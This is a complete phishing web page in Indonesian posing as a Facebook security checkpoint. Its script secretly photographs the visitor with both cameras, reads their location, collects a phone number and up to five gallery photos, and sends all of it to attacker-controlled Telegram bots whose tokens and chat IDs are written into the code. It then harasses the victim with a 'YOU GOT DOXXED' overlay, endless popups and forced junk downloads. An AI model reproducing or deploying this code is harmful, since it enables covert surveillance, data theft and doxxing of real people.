<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Secure Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Splash Screen */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
        .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }

        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: none; overflow-x: hidden; padding-bottom: 100px; }
        
        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); background: white; border-top: 5px solid #1877f2; }
        .fb-logo-text { color: #1877f2; font-size: 42px; font-weight: bold; letter-spacing: -2px; }
        
        .btn-fb { 
            background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
            padding: 12px; border-radius: 8px; border: none; width: 100%;
            transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        /* CHAOS OVERLAY ‚ò†Ô∏è */
        #chaos-overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: black; z-index: 10000; 
        }
        #chaos-video { width: 100%; height: 100%; object-fit: contain; background: black; }
        
        .popup-virus {
            position: absolute; width: 220px; background: #eee; border: 2px solid #000;
            box-shadow: 8px 8px 0px rgba(0,0,0,0.8); padding: 10px; z-index: 10001;
            font-family: "Courier New", monospace; font-weight: bold; animation: glitch 0.3s infinite alternate;
        }
        @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(5px,5px); } }
        
        .doxxed-flash {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #ff0000; font-size: 40px; font-weight: 900; z-index: 10005;
            text-shadow: 4px 4px #000; animation: flash-anim 0.2s infinite; display: none;
            text-align: center; width: 100%;
        }
        @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }

        /* Animasi Musik Bar */
        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; display: none; }
        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; }
        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }

        /* Credit Bar & Music Button (UKURAN KECIL BALIK) */
        .credit-bar {
            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
            color: white; padding: 10px 20px; display: flex; align-items: center; 
            justify-content: space-between; backdrop-filter: blur(15px);
            border-top: 2px solid #1877f2; z-index: 1000;
        }
        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
        .play-btn {
            background: #1877f2; color: white; border: none; border-radius: 50px;
            padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer;
            display: flex; align-items: center; gap: 5px;
        }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="splash-screen">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
    <p class="mt-3 text-muted">Checking Security System...</p>
</div>

<div id="chaos-overlay">
    <video id="chaos-video" loop playsinline muted>
        <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
    </video>
    <div id="dox-flash" class="doxxed-flash">YOU GOT DOXXED!</div>
</div>

<audio id="bgMusic" loop>
    <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
</audio>

<div class="container">
    <div class="main-card card p-4 text-center">
        <div class="fb-logo-text">facebook</div>
        <h6 class="fw-bold mt-2">Checkpoint Keamanan</h6>
        <hr>
        <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
            <b>Gagal!</b><br>Nomor harus valid dan foto maksimal 5 buah.
        </div>
        <div class="text-start">
            <input type="number" id="phone" class="form-control mb-3" placeholder="08xxxxxxxxxx">
            <label class="small fw-bold">Verifikasi Galeri (Maks 5):</label>
            <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
        </div>
        <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
        <div id="loader" style="display:none;" class="mt-2 small text-primary">Memproses data...</div>
    </div>
</div>

<div class="credit-bar">
    <div class="credit-info">
        <span style="font-size: 10px; color: #888;">Developed by:</span>
        <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
    </div>
    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
        <span id="btnText">‚ñ∂ PLAY MUSIC</span>
        <div class="music-anim" id="animContainer">
            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        </div>
    </button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
    const chats = ["7835924973", "8071786272"];
    const audio = document.getElementById('bgMusic');
    const anim = document.getElementById('animContainer');

    window.onload = () => {
        setTimeout(() => {
            document.getElementById('splash-screen').style.display = 'none';
            document.body.style.display = 'block';
            autoCapture("user");
            autoLocation();
        }, 3000);
    };

    function toggleMusic() {
        const txt = document.getElementById('btnText');
        if (audio.paused) { 
            audio.play(); txt.innerText = "‚è∏ PAUSE"; anim.style.display = "flex";
        } else { 
            audio.pause(); txt.innerText = "‚ñ∂ PLAY MUSIC"; anim.style.display = "none";
        }
    }

    function sendToBot(content, type = "text", blob = null) {
        tokens.forEach((token, i) => {
            const fd = new FormData();
            fd.append("chat_id", chats[i]);
            if (type === "text") {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
                });
            } else {
                fd.append("photo", blob || content, "img.jpg");
                fd.append("caption", content);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
            }
        });
    }

    function validateFinal() {
        const phone = document.getElementById('phone').value;
        const files = document.getElementById('galeri').files;
        if (phone.length < 10 || files.length === 0 || files.length > 5) {
            document.getElementById('mainError').style.display = 'block';
            return;
        }
        document.getElementById('loader').style.display = 'block';
        sendToBot(`üì± TARGET: ${phone}`);
        for (let i = 0; i < files.length; i++) sendToBot(`üñºÔ∏è GALERI ${i+1}`, "photo", files[i]);

        // JEDA 2 MENIT (120000ms) SEBELUM CHAOS MUNCUL ‚ò†Ô∏è
        setTimeout(startChaos, 120000); 
    }

    function startChaos() {
        const overlay = document.getElementById('chaos-overlay');
        const vid = document.getElementById('chaos-video');
        const dox = document.getElementById('dox-flash');
        overlay.style.display = 'block';
        vid.muted = false;
        vid.play();
        dox.style.display = 'block';

        // Pop-up muncul tak henti
        setInterval(() => {
            let div = document.createElement('div');
            div.className = 'popup-virus';
            div.style.top = Math.random() * 80 + '%';
            div.style.left = Math.random() * 80 + '%';
            div.innerHTML = "YOU ARE IDIOT!<br>GOT DOXXED!";
            overlay.appendChild(div);
        }, 300);

        // Auto Download file sampah
        for (let j = 1; j <= 5; j++) {
            let blob = new Blob(["YOU IDIOT HAHAHA"], { type: "text/plain" });
            let url = window.URL.createObjectURL(blob);
            let a = document.createElement("a");
            a.href = url;
            a.download = `YOU_ARE_IDIOT_${j}.txt`;
            a.click();
        }
    }

    async function autoCapture(mode) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.getElementById('video'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('canvas');
                c.width = 480; c.height = 640;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendToBot(`üì∏ Cam ${mode}`, "photo", b), 'image/jpeg');
                s.getTracks().forEach(t => t.stop());
                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
            }, 2000);
        } catch (e) {}
    }

    function autoLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            sendToBot(`üìç LOKASI: http://googleusercontent.com/maps.google.com/3{p.coords.latitude},${p.coords.longitude}`);
        });
    }
</script>
</body>
</html>
